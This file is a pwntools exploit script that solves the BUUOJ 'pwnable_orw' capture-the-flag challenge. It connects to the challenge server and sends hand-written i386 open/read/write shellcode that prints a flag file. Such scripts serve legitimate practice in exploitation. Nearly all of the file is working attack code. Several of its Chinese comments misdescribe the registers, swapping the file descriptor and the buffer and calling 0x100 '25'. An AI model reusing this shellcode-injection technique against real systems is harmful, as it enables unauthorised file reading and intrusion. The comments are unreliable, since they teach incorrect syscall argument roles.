'''
@Author       : 白银
@Date         : 2023-05-06 09:07:16
@LastEditors  : 白银
@LastEditTime : 2023-05-06 11:34:27
@FilePath     : /pwn/orw.py
@Description  : https://buuoj.cn/challenges#pwnable_orw
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './orw'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 29603)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

# push 0x00000000: 将一个字节的0压入栈中，作为文件的权限标志
# push 0x7478742e: 将字符串".txt"的ASCII码压栈中
# push 0x67616c66: 将字符串"flag"的ASCII码压栈
# mov eax, 5: 将5号系统（x86是__NR_open）调用存储到EAX寄存器中
# mov ebx, esp: 将栈指针存储到EBX寄存器中，以便让系统调用知道文件名的位置
# xor edx, edx: 清空EDX寄存器，以表示新文件不需要设置任何标志位
# xor ecx, ecx: 将ECX寄存器设置零，以表示新文件的访问权限全部为0，即默认情况下具有最大权限 0666
# int 0x80: 触发系统调用
payload = '''
push 0x00000000
push 0x7478742e 
push 0x67616c66 
mov eax, 5
mov ebx, esp
xor edx, edx
xor ecx, ecx
int 0x80
'''

# mov eax, 3: 将3号系统（x86是__NR_read）调用存储到EAX寄存器中
# mov ecx, ebx: 将之前存储的文件描述符存储到ECX寄存器中，以便让系统调用知道要从哪个文件读取数据
# mov ebx, 3: 将文件数据的缓冲区地址（即读取后数据存储的内存地址）存储到EBX寄存器中
# mov edx, 0x100: 将读取的最大字节数25 存储到EDX寄存器中，以便让系统调用知道需要读取多少字节的数据
# int 0x80: 触发系统调用，读取文件中的数据，并将数据存储到之前存储的地址中
payload +='''
mov eax, 3
mov ecx, ebx
mov ebx, 3
mov edx, 0x100
int 0x80
'''

# mov eax, 4: 将4号系统（x86是__NR_write）调用存储到EAX寄存器中
# mov ebx, 1: 将标准输出的文件描述符1存储到EBX寄存器中，以便让系统调用知道要将数据输出到哪个文件
# int 0x80: 触发系统调用，将数据输出到标准输出中
payload +='''
mov eax, 4
mov ebx, 1
int 0x80
'''

# mov eax, 6: 将6号系统（x86是__NR_close）调用存储到EAX寄存器中
# mov ebx, 3: 将之前创建的文件的文件描述符3存储到EBX寄存器中，以便让系统调用知道要关闭哪个文件
# int 0x80: 触发系统调用，关闭文件
payload +='''
mov eax, 6
mov ebx, 3
int 0x80
'''

# mov eax, 1: 将1号系统（x86是__NR_exit）调用存储到EAX寄存器中
# xor ebx, ebx: 将EBX寄存器清零并将返回状态码存储在其中。因为返回状态码为0，所以此处将EBX清零
# int 0x80: 触发系统调用，退出程序
payload +='''
mov eax, 1
xor ebx, ebx
int 0x80
'''

shellcode=asm(payload)
io.sendlineafter('shellcode:', shellcode)

io.interactive()